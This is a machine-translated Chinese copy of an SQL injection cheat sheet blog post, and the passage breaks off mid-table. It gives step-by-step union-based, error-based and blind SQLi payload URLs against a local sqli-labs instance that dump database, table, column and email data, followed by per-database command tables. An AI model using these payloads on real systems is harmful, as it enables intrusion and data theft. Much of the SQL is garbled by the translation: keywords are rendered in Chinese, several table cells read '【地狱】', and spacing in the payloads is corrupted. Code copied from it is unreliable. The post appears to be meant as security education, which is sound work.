<html>
<head>
<title>Download SQL Injection Cheat Sheet PDF for Quick References</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>下载SQL注入备忘单PDF作为快速参考</h1>
<blockquote>原文：<a href="https://hackr.io/blog/sql-injection-cheat-sheet#0001-01-01">https://hackr.io/blog/sql-injection-cheat-sheet#0001-01-01</a></blockquote><div><div class="content">
										<p id="h.pn6svocwrvff" class="c54 title"><span class="c39">2023年网络攻击风险</span>横行。这种攻击损害了宝贵数据的完整性和可靠性，使得<span class="c39">网络安全</span> <span class="c1">比以往任何时候都更加重要。一种常见的网络攻击是SQL注入，它操纵数据库并试图访问存储的信息。如果您的网站存储了重要的用户信息，这种攻击会更加普遍。</span></p>
<p class="c2"><span class="c1"> <a href="https://hackr.io/blog/best-it-certifications"> IT专业人士</a>必须学会如何分析被篡改的数据，包括了解有用的事实和捷径。这就是为什么我们创建了这个SQL注入小抄供您参考。在其中，你会发现常见的SQL注入命令，SQL注入代码列表，等等。</span></p>
<p class="c2">使用此SQL注入攻击备忘单了解SQL注入漏洞的不同变种。</p>
<p class="c2">但是在我们继续之前，让我们讨论一下SQL注入袭击事件。</p>

<h2 id="h-c5jx9r9juuix" class="c30"><span class="c28 c10">什么是SQL注入攻击？</span></h2>
<p class="c2">SQL注入也被称为SQLi。在SQLi注入攻击中，一种流行的网络攻击媒介注入恶意SQL代码，以故意攻击、访问和修改网站的后端数据库。</p>
<p class="c2">在这种攻击中，黑客试图访问机密数据，如银行详细信息、个人信息、用户名、密码等。一旦他们访问数据，他们可能会更改或窃取数据，从而给您的企业和客户带来巨大的安全损害和风险。</p>
<p class="c2"><span class="c1">接下来，让我们来看看不同类型的SQL注入，这样你就可以更好地理解这种攻击是如何工作的，以及攻击者可能攻击你的数据库的地方。</span></p>
<h2 id="h-707j3ia35am5" class="c30"><span class="c28 c10">不同类型的SQL注入攻击</span></h2>
<p class="c2">以下是一些不同类型的SQL注入攻击。</p>
<ul>
<li><span class="c10"> <strong>带内SQLi(经典)</strong> : </span> <span class="c1">攻击者使用相同的通信信道发起攻击并收集结果。这是最常见的SQLi攻击之一，因为它很容易实现。带内SQLi攻击还有几个分支:</span></li>
<li><span class="c6"> <strong>基于错误的SQLi </strong> : </span> <span class="c1"> <span class="c1"> <span class="c1">攻击者对数据库执行一些操作，产生错误消息。然后，他们可以使用这些错误消息提取数据，比如数据库结构。</span> </span> </span></li>
<li><span class="c6"> <strong>基于Union的SQLi </strong> : </span> <span class="c1">这种技术使用UNION SQL操作符，它将多个select语句组合在一起，得到一个包含对攻击者有利的数据的HTTP响应。</span></li>
<li><span class="c10"> <strong>推理SQLi(盲)</strong> : </span> <span class="c1">在这种类型的攻击中，攻击者向服务器发送SQL注入有效载荷数据，并分析服务器的响应和行为，以了解数据库的结构。与带内SQLi不同，数据不会从网站的数据库传输给攻击者。因此，无法在带内看到提取的数据。盲SQL注入速度较慢，因为它们依赖于服务器的响应和行为模式。在构思盲SQL注入备忘单时，请记住以下子攻击:</span></li>
<li><span class="c6"> <strong>布尔</strong> : </span> <span class="c1"> <span class="c1"> <span class="c1">攻击者向数据库发送SQL查询，因此应用程序将根据查询是真还是假返回数据。这个结果也会影响HTTP响应，并在HTTP响应中添加攻击者使用的信息。</span> </span> </span></li>
<li><span class="c6"> <strong>基于时间的</strong> : </span> <span class="c1">攻击者向数据库发送一个SQL查询，让数据库在做出反应之前等待。攻击者将分析数据库所花费的时间。然后，根据结果，将立即生成HTTP响应，或者在攻击者使用一段等待时间后生成。</span></li>
<li><span class="c10"> <strong>带外SQLi </strong> : </span> <span class="c1">这种攻击只有在数据库服务器上启用了某些功能时才会起作用。当上述两种类型的攻击不起作用时，黑客将带外SQLi作为最后的手段。这种攻击依靠服务器的能力来创建DNS或HTTP请求，以便将数据传输给攻击者。</span></li>
</ul>
<p class="c2">现在，我们来看一些SQL注入袭击的例子。</p>
<p class="c2"><span class="c1"> <a class="btn btn-primary btn-call-to-action " href="https://click.linksynergy.com/deeplink?id=jU79Zysihs4&amp;mid=39197&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Fthe-complete-sql-bootcamp%2F" target="_blank" rel="noopener">完整SQL Bootcamp 2023:从零到英雄</a> </span></p>

<h2 id="h-7beazyh3sjyx" class="c30"><span class="c28 c10">SQL注入示例</span></h2>
<p class="c2">对于这些例子，我们使用来自Audi1的SQLi-lab系列，其源代码您可以在这里  <span class="c1">找到<span class="c39"> <a class="c18" href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">来重现SQLi攻击。主要目的是访问存储在数据库中的数据。</a></span></span></p>
<p class="c2">继续，我们将提供一个联合SQL注入备忘单，它将使用后端SQL语句来匹配查询。这意味着SQLi攻击过程各不相同。在任何应用程序上协助SQLi攻击媒介的两个基本要素如下:</p>
<ul class="c4 lst-kix_z4g46vbq04wq-0 start">
<li class="c2 c8 li-bullet-0"><span class="c1">显示SQL错误。</span></li>
<li class="c2 c8 li-bullet-0"><span class="c1">显示SQL输出。</span></li>
</ul>
<h2 id="h-tfohik979xf6" class="c30"><span class="c28 c10">基于联盟的SQLi </span></h2>
<p class="c2">基于联合的SQLi是一种带内类型的SQLi，也是最简单的一种，因为攻击者可以很容易地从SQL错误中理解后端查询，并可以看到查询的输出。</p>
<p class="c2"><span class="c1">网站看起来没有注入代码，如下图:</span></p>
<p class="c2"><img title="" src="../Images/687d5cda9d3941e6f927b737145421e7.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-1-min.jpg"/></p>
<p class="c2">使用基于联盟的SQLi，您可以轻松影响该网站。</p>
<p class="c2">首先，我们将追加'？id=1 '以获得正常结果:</p>
<p class="c2"><img title="" src="../Images/a0ca22d7adf594c02973f7c0b78261c6.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-2-min.jpg"/></p>
<p class="c2">网址:<span class="c39"><a class="c18" href="https://www.google.com/url?q=http://localhost:8081/sqli-labs/Less-1/?id%3D1&amp;sa=D&amp;source=editors&amp;ust=1651594138482609&amp;usg=AOvVaw2vLVHY84LlZWEUopBzYKit" target="_blank" rel="noopener">http://localhost:8081/sqli-labs/Less-1/？</a>id = 1</span></p>
<p class="c2">网站运行正常。但是现在，我们会添加恶意代码来黑网站。</p>
<p class="c2">首先，想象一下开发人员可能在应用程序的后面使用了什么。这里，我们假设开发人员可能使用了下面的SQL语句结构来点击并尝试该方法。</p>
<pre class="language-sql"><code>SELECT &lt;col_1&gt;, &lt;col_2&gt;, ..., &lt;col_n&gt; FROM &lt;database_name&gt;.&lt;table_name&gt; WHERE &lt;username&gt; = '&lt;user_input&gt;' AND &lt;password&gt; = '&lt;user_password&gt;' LIMIT 0,1</code></pre>
<p class="c0">但是，在继续之前，请确保您对<span class="c39"> <a class="c18" href="https://hackr.io/admin/blog/posts/542/https:/hackr.io/blog/how-to-learn-sql/"> SQL </a> </span> <span class="c1">有很好的了解。</span></p>
<p class="c2">在上面的例子中，尖括号中使用的词还没有被确认。剩下的部分是语法和语言关键字，它们可能因数据库的类型而异。</p>
<p class="c2">现在，我们将通过添加单个反逗号(')、双反逗号(")或转义字符(SQL中的反斜杠(\)来中断SQL语句。</p>
<p class="c2"><span class="c1">一般来说，在SQL语句中，单引号或双引号将用户输入的字符串括起来。但是，如果我们在查询之间使用其中的任何一个，它将使SQL语句不平衡，并导致屏幕上出现错误。</span></p>
<p class="c2"><img title="" src="../Images/2ea49733929e8f98f229f64c82e2ceb1.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-3-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id=1\ </span></p>
<p class="c2">如你所见，你会得到一个错误。因此，您必须检查是什么符号('，''，\)导致了这个错误。现在，我们将在简单参数中插入一个恶意的SQL查询。但是首先，我们必须确保代码的执行是平衡的。</p>
<p class="c2"><span class="c1">例如，如果开发者已经使用了一个括号，我们也必须添加一个括号来平衡代码。您还可以添加注释字符来平衡语句。</span></p>
<p class="c2"><img title="" src="../Images/9870e436700c2079405a7ac503ca9fde.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-4-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id = 1 '–+</span></p>
<p class="c2">为了平衡代码，您需要知道表中的列数，这将有助于您在与原始输出进行union后转储查询输出。</p>
<p class="c2"><span class="c1">要找出列数，可以使用‘ORDER BY’子句，该子句根据给定的列数对表中的条目进行排序(asc/dsc)。但是如果我们在输出中提供的列数多于实际总数，您将会得到一个错误。您可以使用如下所示的“ORDER BY”子句。</span></p>
<pre class="language-sql"><code>SELECT col1 FROM table1 ORDER BY 1</code></pre>
<p class="c0">上述查询将对第1列的查询输出进行排序。</p>
<p class="c2">要找到获得成功结果的最大列数，您需要从小到大开始。对于这个网站，我们使用了最大数量的栏目:三个。</p>
<p class="c2"><img title="" src="../Images/2ab3e85048c6d2cb8a6f1e6481dc077a.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-5-min.jpg"/></p>

<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id = 1 '+order+by+3 –+</span></p>
<p class="c2"><span class="c1">在上图中，请注意URL中的“%27”是为单个反逗号(')编码的URL，而“+”用于表示空格。我们收到一个超出最大列数的错误。现在，我们将尝试第4列。</span></p>
<p class="c2"><img title="" src="../Images/eb1c5096143564a59f4897b661e333ff.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-6-min.jpg"/></p>
<p class="c2 c50"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id = 1 '+order+by+4 –+</span></p>
<p class="c2">用' UNION '子句替换' ORDER BY '子句后，我们就有了一个在屏幕上转储数据的地方。</p>
<p class="c2"><img title="" src="../Images/d1c8ac599cf4664e9fc31e5a720e3817.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-7-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id=1'+union+select+1，2，3 –+</span></p>
<p class="c2">现在，我们已经硬编码了要联合的列值，以查看这些值是否被转储。</p>
<p class="c2"><span class="c1">在两个表的联合中，两个表的列数应该相等。但在这里，它是三。我们用无效id替换了有效id来显示数据。现在，在union之后只剩下一行，它将是我们注入查询的输出。</span></p>
<p class="c2"><img title="" src="../Images/3d5206bd152283910b85925a8b1bbdef.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-8-min.jpg"/></p>

<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id=-1'+union+select+1，2，3 –+</span></p>

<p class="c2"><span class="c1">在这里，我们使用-1使id无效，因此我们的数据“2”和“3”现在被显示，而不是原始数据。我们现在将使用数据库函数从数据库中提取信息。</span></p>
<p class="c2"><img title="" src="../Images/83c95072a08a810aa3bf8f8281bf9f30.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-9-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id=-1'+union+select+1，database()，3 –+</span></p>
<p class="c2"><span class="c1">在上面的URL中，我们在注入查询中使用了“database()”函数而不是“2”来获取当前的数据库名称，这里是“security”。下面，我们提到了一些提取信息的常用SQL函数。</span></p>
<ul class="c4 lst-kix_ma1qz0cabt7c-0 start">
<li class="c2 c8 li-bullet-0"><span class="c10"> version(): </span> <span class="c1">获取SQL的当前版本。</span></li>
<li class="c2 c8 li-bullet-0"><span class="c10"> @@datadir: </span> <span class="c1">获取SQL数据库所在的目录。</span></li>
<li class="c2 c8 li-bullet-0"><span class="c10"> User()或current_user: </span> <span class="c1">获取创建或管理数据库的用户。</span></li>
</ul>
<p class="c2">假设您想要提取表名、列名和字段的信息。在这种情况下，您可以使用名为“information_schema”的数据库中的特定表，该数据库维护所有用户创建的数据库、表和列的元数据。</p>
<p class="c2">我们将使用下面的查询从当前数据库中提取表格。</p>
<pre class="language-sql"><code>SELECT table_name FROM information_schema.tables from table_schema=database() LIMIT 0,1;</code></pre>
<p class="c0">这将返回当前数据库中的表名，在LIMIT子句后递增第一个参数。</p>
<p class="c2"><img title="" src="../Images/91672efd4c846dfe3cb0520ba32c952c.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-10-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id=-1'+union+select+1，table_name，3+from+information _ schema . tables+where+table _ schema = database()+limit+0，1 –+</span></p>
<p class="c2"><span class="c1">您也可以使用‘information _ schema’数据库中的‘columns’表从指定的表中获取列名。</span></p>

<pre class="language-sql"><code>SELECT column_name FROM information_schema.columns WHERE table_name = &lt;specific_table_name&gt; LIMIT 0,1;</code></pre>
<p class="c0">与表名一样，您也可以从指定的表中获取列名，并可以遍历表的所有行“columns:”:</p>

<p class="c2"><img title="" src="../Images/5bcc43c0d997d2146fe7a3e3a26ac715.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-11-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id=-1'+union+select+1，column_name，3+from+information _ schema . columns+where+table _ name = ' emails '+limit+0，1 –+</span></p>
<p class="c2"><span class="c1">名为“安全”的数据库中“电子邮件”表的第一列名是“id”。同样，第二个列名是“email_id”。</span></p>
<p class="c2">现在，我们将注入以下SQL语句。</p>
<pre class="language-sql"><code>SELECT email_id FROM emails LIMIT 0,1</code></pre>
<p class="c2">在此之后，您将得到如下所示的输出。</p>
<p class="c2"><img title="" src="../Images/eb81eb5617fe7adf93e6bd6823a336c0.png" alt="" data-original-src="https://hackr.io/blog/media/union-based-sqli-12-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-1/？id=-1'+union+select+1，email_id，3+from+emails+limit+0，1 –+</span></p>
<p class="c2">通过这种方式，您可以注入查询来访问存储在数据库中的数据。</p>
<h2 id="h-uiwale6phghb" class="c30"><span class="c28 c10">基于错误的SQLi </span></h2>
<p class="c2"><span class="c1">这种类型的攻击提供给你的是错误消息而不是输出，所以你只需要在SQL错误中注入恶意代码。见下图示例:</span></p>
<p class="c2"><img title="" src="../Images/31e547e1b098f6c11084a5b12fad5a97.png" alt="" data-original-src="https://hackr.io/blog/media/error-based-sqli-1-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-5/？id=1 </span></p>
<p class="c2"><span class="c1">要在屏幕上显示SQL错误，可以使用单引号或双引号。</span></p>
<p class="c2"><img title="" src="../Images/bdae405e13c49d5d82e59f327d14d95b.png" alt="" data-original-src="https://hackr.io/blog/media/error-based-sqli-2-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-5/？id=1' </span></p>
<p class="c2">该方法与基于联合的SQLi相同。唯一的区别是您只能运行特定的查询。该语句有点复杂，会触发一个SQL错误来转储查询的输出。</p>
<pre class="language-sql"><code>SELECT 1 from (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT database()), 0x3a, 0x3a, floor( rand() * 2 ) )a FROM information_schema.columns GROUP BY a ) b;</code></pre>
<p class="c2"><span class="c1">我们将把上面的查询分解成子查询，以便更好地理解它们:</span></p>
<p class="c2"><span class="c1">恶意代码为' SELECT database()'，显示当前数据库名称但出现SQL错误。这里，我们将采用可能重复的多行，并尝试将它们放入一个包或视图中。在出现重复行的情况下，您将通过SQL得到一个运行时错误，用于插入重复行和所需的输出。</span></p>
<p class="c2">一旦你理解了这个复杂的查询是如何工作的，你就可以用更广泛的查询来代替' SELECT database()'部分。我们已经解释了上述复杂查询的子查询。</p>

<p class="c2"><span class="c1">获取当前数据库的名称。您可以用其他查询替换它。</span></p>

<p class="c2">得到一个随机数，要么是0，要么是1。</p>
<ul class="c4 lst-kix_dx2ocfy9bubw-0 start">
<li class="c2 c8 li-bullet-0"><span class="c1"> CONCAT(0x3a，0x3a，(SELECT database())，0x3a，0x3a，floor( rand() * 2 ) ) : </span></li>
</ul>
<p class="c2">它将连接数据库名称左边的两个冒号和右边的两个冒号，并在末尾随机添加0或1。</p>
<ul class="c4 lst-kix_4n8rh28ywa5-0 start">
<li class="c2 c8 li-bullet-0"><span class="c1"> SELECT COUNT(*)，CONCAT(0x3a，0x3a，(SELECT database())，0x3a，0x3a，floor(rand()* 2))a FROM information _ schema . columns GROUP BY a</span></li>
</ul>
<p class="c2"><span class="c1">初始“select”和“from”之间的查询部分将被迭代几次，迭代次数等于数据库information_schema的columns表中的行数。我们有意迭代它来生成重复的行，从而产生运行时错误。查询的这一部分将根据“a”和连接部分的分组选择行数，a是先前连接结果的别名。</span></p>
<pre class="language-sql"><code>SELECT 1 from (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT database()), 0x3a, 0x3a, floor( rand() * 2 ) )a FROM information_schema.columns GROUP BY a ) b;</code></pre>
<p class="c0">现在，我们刚刚将前面的查询嵌套到另一个select语句中，以获得一列。我们不希望它在这里返回结果，所以我们将它硬编码为1，因为我们只需要SQL错误。</p>
<p class="c2">此外，还有一个“b”来给出嵌套查询的别名内部语句，并返回一行。</p>
<p class="c2"><img title="" src="../Images/0a7a1ba04e884f37dc56eea2c04a1aed.png" alt="" data-original-src="https://hackr.io/blog/media/error-based-sqli-3-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-5/？id = 1 '+and+(SELECT 1 FROM(SELECT COUNT(*)，CONCAT(0x3a，0x3a，(SELECT database())，0x3a，0x3a，floor(rand()* 2))a FROM information _ schema . columns GROUP BY a)b)–+</span></p>
<p class="c2">如果没有重复的，你会得到上面的错误。我们将忽略它，并通过刷新页面继续尝试。</p>
<p class="c2"><img title="" src="../Images/5a13183aa2362d86e793e32b02d111a3.png" alt="" data-original-src="https://hackr.io/blog/media/error-based-sqli-4-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-5/？id = 1 '+and+(SELECT 1 FROM(SELECT COUNT(*)，CONCAT(0x3a，x3a，(SELECT database())，0x3a，0x3a，floor(rand()* 2))a FROM information _ schema . columns GROUP BY a)b)–+</span></p>
<p class="c2">通过这种方式，你将得到两边两个冒号之间的数据库名称，你也可以从数据库中提取其他数据。</p>
<h2 id="h-3xneuzd2i17n" class="c30"><span class="c10 c28">盲目SQL注入备忘单</span></h2>
<p class="c2">这里的方法也是一样的，但是有一点额外的技巧。</p>
<p class="c2"><img title="" src="../Images/4a6e7dcd0f2c28bc04ae5ee16dcb55ff.png" alt="" data-original-src="https://hackr.io/blog/media/blind-sql-injection-1-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-8/？id=1' </span></p>
<p class="c2">当您查看上面的图片时，您会看到SQL查询没有错误消息和输出。从这里，您可以注入数据。为此，我们将使用sleep()函数或布尔表达式来获得true或false结果。如下所述，我们将通过两种不同的方法来实现这一点。</p>
<h3 id="h-l0l5twb6wtn9" class="c12"><span class="c25 c10">基于延时:</span></h3>
<p class="c2"><span class="c1">使用sleep()函数，我们将用指定的时间作为参数，在SQL查询的响应中创建一个延迟。</span></p>
<h3 id="h-tvdv2vu4qdvr" class="c12"><span class="c25 c10">基于布尔:</span></h3>
<p class="c2">如果查询成功运行或没有运行，您还可以通过一些肯定的消息来推断输出的真或假。为此，您需要首先创建一个真实的语句，并检查您是否得到了一般的信息。然后，您可以添加我们的查询，看看您是否仍然得到消息，这意味着它是真的，否则是假的。</p>
<p class="c2">现在，我们的任务是将表格或数据库转换成产生真或假的查询。您可以使用' substring()'函数获取给定字符串的子字符串来创建布尔查询。Substring()'函数有三个参数，原始字符串、子字符串的起始索引(索引从1开始)和几个用于标记的字符。</p>
<pre class="language-sql"><code>substring(&lt;original_string&gt;, &lt;starting_index&gt;, &lt;number_of_characters&gt;)</code></pre>
<p class="c2"><span class="c1">为了包含条件语句，您还可以使用“if()”语句，其中第一个参数是条件，第二个参数是真条件的任务，第三个参数是假条件要执行的任务。</span></p>
<pre class="language-sql"><code>if(&lt;condition&gt;, &lt;query1&gt;, &lt;query2&gt;)</code></pre>
<p class="c2">因此，我们可以迭代字母或数字，看看是否满足条件。</p>
<p class="c2"><span class="c1">在这种情况下，我们已经有了数据库名称(‘security’)，所以我们可以使用下面的查询:</span></p>
<pre class="language-sql"><code>if( (substring(database(), 0, 1) == ‘s’), sleep(5), null)</code></pre>
<p class="c2"><span class="c1">我们使用了值为5的睡眠功能。如果数据库名称的第一个字符是' s ',并且我们不做任何其他事情，这将使数据库回复延迟5秒。在这种情况下，您将按计划获得延迟5秒的响应。</span></p>
<p class="c2"><img title="" src="../Images/9c09e8e08239bc0c2c1199fad1499410.png" alt="" data-original-src="https://hackr.io/blog/media/blind-sql-injection-2-min.jpg"/></p>
<p class="c2"><span class="c1">网址:http://localhost:8081/sqli-labs/Less-8/？id = 1 '+和+if( (substring(database()，1，1) = 's ')，sleep(5)，null)–+</span></p>
<p class="c2">在基于布尔运算的情况下，你要么得到一条消息，要么什么都不得到。如果收到消息，查询返回true，否则返回false。</p>
<p class="c2"><span class="c1"> 1 '和(子串(database()，1，1) = 's') - + </span></p>
<p class="c2"><img title="" src="../Images/4bc4fb3d4ffbb3d5498cd0182ee5ec91.png" alt="" data-original-src="https://hackr.io/blog/media/blind-sql-injection-3-min.jpg"/></p>
<p class="c2"><span class="c1">URL:localhost:8081/sqli-labs/Less-8/？id=1'+and+(子串(database()，1，1)= ' s ')–+</span></p>
<p class="c2">这种方法很棘手，因为你必须尝试每一种可能性，花费你大部分的时间。另一种效率较低的方法是使用“ascii()”函数将字符转换成ascii代码来比较数字，因此可以使用关系运算符。</p>
<pre class="language-sql"><code>if( (ascii(substring(database(), 0, 1)) = 115), sleep(5), null )</code></pre>
<h2 id="h-4mf07y9skj2v" class="c30"><span class="c28 c10"> SQL注入命令</span></h2>
<p class="c2">上图中，我们在进行SQL注入攻击时已经浏览了一些有用的语法。以下是一些常见的SQL注入命令:</p>
<h3 id="h-ybq7s5upmvb0" class="c12"><span class="c25 c10">字符串串联</span></h3>
<p class="c2">该命令<span class="c1">将多个字符串连接成一个字符串。</span></p>
<table class="c20">
<tbody>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c29" colspan="1" rowspan="1">
<p class="c2">【地狱】【地狱】【地狱】</p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c29" colspan="1" rowspan="1">
<p class="c2"><span class="c1"/></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c29" colspan="1" rowspan="1">
<p class="c2">【地狱】【地狱】【地狱】</p>
</td>
</tr>
<tr class="c36">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c44" colspan="1" rowspan="1">
<p class="c2"><span class="c1">‘hel’‘met’【注意两根弦之间的间距】</span></p>
<p class="c2"><span class="c1"> CONCAT('hel '，' met') </span></p>
</td>
</tr>
</tbody>
</table>
<h3 id="h-gabys9nyf76" class="c12"><span class="c25 c10">子串</span></h3>
<p class="c2">这个命令给出了字符串的指定部分。</p>
<table class="c20">
<tbody>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> SUBSTR('头盔'，4，2) </span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1">子串('头盔'，4，2) </span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1">子串('头盔'，4，2) </span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1">子串('头盔'，4，2) </span></p>
</td>
</tr>
</tbody>
</table>
<h3 id="h-2oks9htz0cbq" class="c12"><span class="c25 c10">评论</span></h3>
<p class="c2">这个命令<span class="c1">删除正在执行的代码部分。</span></p>
<table class="c20">
<tbody>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c22" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> -注释</span></p>
</td>
</tr>
<tr class="c36">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c22" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> -注释</span></p>
<p class="c2"><span class="c1">/*评论*/ </span></p>
</td>
</tr>
<tr class="c36">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c22" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> -注释</span></p>
<p class="c2"><span class="c1">/*评论*/ </span></p>
</td>
</tr>
<tr class="c32">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1">#评论</span></p>
<p class="c2"><span class="c1"> -注释【注意双破折号后的空格】</span></p>
<p class="c2"><span class="c1">/*评论*/ </span></p>
</td>
</tr>
</tbody>
</table>
<h3 id="h-y6q44gm3xgxg" class="c12"><span class="c25 c10">数据库版本</span></h3>
<p class="c2"><span class="c1">获取数据库的当前版本。</span></p>
<table class="c20">
<tbody>
<tr class="c36">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1">从v $版本中选择横幅</span></p>
<p class="c2"><span class="c1">从v $实例中选择版本</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择@ @版本</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c22" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择版本()</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c35" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择@ @版本</span></p>
</td>
</tr>
</tbody>
</table>
<h3 id="h-9a7qkiwd62fy" class="c12"><span class="c25 c10">数据库内容</span></h3>
<p class="c2">在这里，您可以获得数据库、列和其他表的详细信息。</p>
<table class="c20">
<tbody>
<tr class="c36">
<td class="c31" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c16" colspan="1" rowspan="1">
<p class="c2"><span class="c1">从所有表格中选择*</span></p>
<p class="c2"><span class="c1"> SELECT * FROM all_tab_columns其中TABLE _ NAME = ' TABLE-NAME-HERE '</span></p>
</td>
</tr>
<tr class="c36">
<td class="c31" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c16" colspan="1" rowspan="1">
<p class="c2"><span class="c1">SELECT * FROM information _ schema . tables</span></p>
<p class="c2"><span class="c1">SELECT * FROM information _ schema . columns其中TABLE _ NAME = ' TABLE-NAME-HERE '</span></p>
</td>
</tr>
<tr class="c36">
<td class="c31" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c16" colspan="1" rowspan="1">
<p class="c2"><span class="c1">SELECT * FROM information _ schema . tables</span></p>
<p class="c2"><span class="c1">SELECT * FROM information _ schema . columns其中TABLE _ NAME = ' TABLE-NAME-HERE '</span></p>
</td>
</tr>
<tr class="c36">
<td class="c31" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c16" colspan="1" rowspan="1">
<p class="c2"><span class="c1">SELECT * FROM information _ schema . tables</span></p>
<p class="c2"><span class="c1">SELECT * FROM information _ schema . columns其中TABLE _ NAME = ' TABLE-NAME-HERE '</span></p>
</td>
</tr>
</tbody>
</table>
<h3 id="h-fk6oryydls2s" class="c12"><span class="c25 c10">条件错误</span></h3>
<p class="c2">该命令测试布尔条件。</p>
<table class="c20">
<tbody>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c24" colspan="1" rowspan="1">
<p class="c2"><span class="c1">SELECT CASE WHEN(YOUR-CONDITION-HERE)THEN to _ char(1/0)ELSE NULL END FROM dual</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c24" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择CASE WHEN(YOUR-CONDITION-HERE)th EN 1/0否则空结束</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c24" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择CASE WHEN (YOUR-CONDITION-HERE)然后转换(1/0为文本)否则空结束</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
